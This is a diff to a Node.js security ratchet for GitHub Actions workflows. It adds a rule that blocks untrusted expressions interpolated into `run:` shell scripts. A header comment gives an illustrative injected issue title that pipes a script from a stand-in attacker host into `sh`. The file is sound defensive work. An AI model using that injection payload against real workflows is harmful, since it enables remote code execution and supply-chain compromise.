@@ -1,5 +1,6 @@
 #!/usr/bin/env node
-// Every workflow scopes its token, and no NEW action floats on a mutable tag.
+// Every workflow scopes its token, no NEW action floats on a mutable tag, and no
+// event data reaches a shell as CODE.
 //
 // THE GAP THIS CLOSES: `ci.yml`'s header says every action is pinned to a full
 // commit SHA. That was true of `ci.yml` and of nothing else — `release.yml` and
@@ -38,12 +39,28 @@
 // already immutable by digest and carries a provenance attestation (release.yml).
 // The exposure here is a build-time base, not a signed published one.
 //
+// THE THIRD RULE — `run-injection` — IS A DIFFERENT FAILURE WITH THE SAME SHAPE.
+// `${{ ... }}` is not a shell variable. Actions substitutes the expression into
+// the script TEXT before bash is started, so `${{ github.event.issue.title }}` in
+// a `run:` line is the issue title *as code*: an issue called
+// `x"; curl evil.sh | sh; #` runs on the runner, with that job's token. This
+// repository dispatches agents from issues and publishes signed images, so the
+// distance from a stranger's text to the supply chain is exactly one such line.
+//
+// The rule: nothing an outsider (or a previous step, or a model) can influence
+// may be interpolated into a `run:` script. Pass it through `env:` on the step
+// and read `"$VAR"` — bash then sees a value, never a command. TRUSTED_IN_RUN
+// below is the short list of contexts that are fixed-shape and repo-controlled;
+// everything else is blocking, including `steps.*.outputs.*` and `needs.*`,
+// whose values are produced by earlier steps and are therefore only as trusted
+// as whatever wrote them.
+//
 //   npm run security:actions              # the ratchet (CI runs this)
 //   npm run security:actions -- --resolve # rewrite the allowlisted refs to SHAs
 //   npm run security:actions -- --json
 //
-// EXIT CODES: 0 clean · 1 an unpinned ref outside the allowlist, or a workflow
-// with no `permissions:` block.
+// EXIT CODES: 0 clean · 1 an unpinned ref outside the allowlist, a workflow
+// with no `permissions:` block, or an expression interpolated into a `run:`.
 
 import fs from 'node:fs';
 import path from 'node:path';
@@ -121,6 +138,87 @@ export function hasTopLevelPermissions(text) {
   return /^permissions:/m.test(text);
 }
 
+// --- run: scripts, and what may be substituted into one -----------------------
+
+/**
+ * Every line of every `run:` script, with its 1-based line number. Both forms
+ * matter: the inline one (`- run: npm ci`) and the block scalar (`run: |`),
+ * which is where the multi-line shell that actually gets exploited lives.
+ *
+ * Deliberately a line reader rather than a YAML parse: this file is dependency-
+ * free by design (the ratchet has to run in jobs that never `npm ci`), and the
+ * shape it needs — "which lines end up inside a shell script" — is decided by
+ * indentation, which survives being read line by line.
+ */
+export function runScriptLines(text) {
+  const lines = text.split(/\r?\n/);
+  const out = [];
+  let i = 0;
+  while (i < lines.length) {
+    const m = /^(\s*)(-\s+)?run:[ \t]*(.*)$/.exec(lines[i]);
+    if (!m) {
+      i += 1;
+      continue;
+    }
+    const indent = m[1].length + (m[2] ? m[2].length : 0);
+    const rest = m[3].trim();
+    // `|`, `>`, `|-`, `>-`, `|+`, `>2` … are block indicators, not script.
+    if (rest && !/^[|>][+-]?\d*$/.test(rest)) {
+      out.push({ line: i + 1, text: rest });
+      i += 1;
+      continue;
+    }
+    let j = i + 1;
+    for (; j < lines.length; j++) {
+      if (lines[j].trim() === '') continue;
+      if (/^\s*/.exec(lines[j])[0].length <= indent) break;
+      out.push({ line: j + 1, text: lines[j] });
+    }
+    i = j;
+  }
+  return out;
+}
+
+/**
+ * Contexts whose value cannot be steered by anyone outside this repository AND
+ * whose shape is fixed (an id, a SHA, a URL, a value written in the workflow
+ * file itself). Everything absent from this list is blocking in a `run:`.
+ *
+ * `github.event.*` is absent on purpose — all of it is event payload, and the
+ * numeric-looking fields are not worth the exception: the reader of the next
+ * workflow should not have to know which halves of a payload are safe.
+ */
+export const TRUSTED_IN_RUN = [
+  /^runner\./,
+  /^job\./,
+  /^strategy\./,
+  /^matrix\./, // values written in the workflow file
+  /^github\.(repository|repository_id|repository_owner|repository_owner_id|sha|run_id|run_number|run_attempt|workflow|workflow_sha|event_name|job|action|action_repository|workspace|api_url|server_url|graphql_url|retention_days)$/,
+];
+
+const EXPRESSION_RE = /\$\{\{([\s\S]*?)\}\}/g;
+const CONTEXT_RE = /\b(github|env|inputs|secrets|steps|needs|vars|matrix|runner|job|strategy)((?:\.[A-Za-z0-9_-]+)*)/g;
+
+/** Every context path referenced by one `${{ … }}` expression body. */
+export function contextRefs(expression) {
+  return [...expression.matchAll(CONTEXT_RE)].map((m) => `${m[1]}${m[2]}`);
+}
+
+export const isTrustedInRun = (ref) => TRUSTED_IN_RUN.some((re) => re.test(ref));
+
+/** `[{ ref, line }]` — the substitutions a shell in this workflow would execute. */
+export function untrustedRunRefs(text) {
+  const out = [];
+  for (const { line, text: script } of runScriptLines(text)) {
+    for (const [, body] of script.matchAll(EXPRESSION_RE)) {
+      for (const ref of contextRefs(body)) {
+        if (!isTrustedInRun(ref)) out.push({ ref, line });
+      }
+    }
+  }
+  return out;
+}
+
 const finding = (severity, rule, file, line, message, fix) => ({ severity, rule, file, line, message, fix });
 
 /** Pure. `files` is `[{file, text}]`. */
@@ -139,6 +237,22 @@ export function runChecks(files, allowlist = PIN_ALLOWLIST) {
           'This workflow has no top-level `permissions:` block.',
           'Every job in it inherits the repository default for GITHUB_TOKEN. Add `permissions:\\n  contents: read` ' +
             'and widen per job only where a job genuinely writes something.',
+        ),
+      );
+    }
+
+    for (const { ref, line } of untrustedRunRefs(text)) {
+      out.push(
+        finding(
+          'blocking',
+          'run-injection',
+          file,
+          line,
+          `\`\${{ ${ref} }}\` is substituted into a \`run:\` script.`,
+          'Actions expands it into the script text before bash starts, so its value is executed as code. ' +
+            `Move it to \`env:\` on that step (e.g. \`MY_VAR: \${{ ${ref} }}\`) and read \`"$MY_VAR"\` in the ` +
+            'script — bash then sees a value. If it is genuinely fixed-shape and repo-controlled, add it to ' +
+            'TRUSTED_IN_RUN with the reason, rather than making this pass by moving the line.',
         ),
       );
     }
@@ -248,7 +362,8 @@ export function parseArgs(argv) {
 }
 
 export function render(findings) {
-  if (findings.length === 0) return 'check-actions: every action is pinned and every workflow scopes its token.';
+  if (findings.length === 0)
+    return 'check-actions: every action is pinned, every workflow scopes its token, and no expression reaches a shell.';
   const lines = findings.map(
     (f) => `${f.severity === 'blocking' ? 'BLOCK' : ' note'}  ${f.file}:${f.line}  [${f.rule}] ${f.message}\n        ${f.fix}`,
   );
